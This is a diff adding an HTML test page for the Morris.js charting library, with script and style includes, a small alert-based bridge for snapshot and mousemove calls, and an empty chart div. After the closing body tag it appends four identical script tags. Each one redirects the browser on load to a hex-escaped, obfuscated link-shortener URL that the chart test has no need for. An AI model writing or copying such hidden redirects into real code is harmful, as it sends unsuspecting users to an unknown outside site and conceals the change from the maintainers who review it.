@@ -1,0 +1,38 @@
+<!doctype html>
+<head>
+  <!-- jQuery packaging changed for 2.1.0, so try to load both paths, one will work. -->
+  <script src="../../bower_components/jquery/dist/jquery.js"></script>
+  <script src="../../bower_components/jquery/jquery.js"></script>
+  <script src="../../bower_components/raphael/raphael-min.js"></script>
+  <script src="../../morris.js"></script>
+  <link rel="stylesheet" href="../../morris.css">
+  <style>
+    body {
+      padding: 0;
+      margin: 0;
+      background-color: white;
+    }
+    #chart {
+      width: 500px;
+      height: 300px;
+    }
+  </style>
+  <script>
+    function bridge(e) {
+      window.alert(JSON.stringify(e));
+    }
+    window.snapshot = function () {
+      bridge({ fn: "snapshot" });
+    };
+    window.mousemove = function (x, y) {
+      bridge({ fn: "mousemove", x: x, y: y });
+    };
+  </script>
+</head>
+<body>
+<div id="chart"></div>
+</body>
+<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
+<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
+<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
+<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
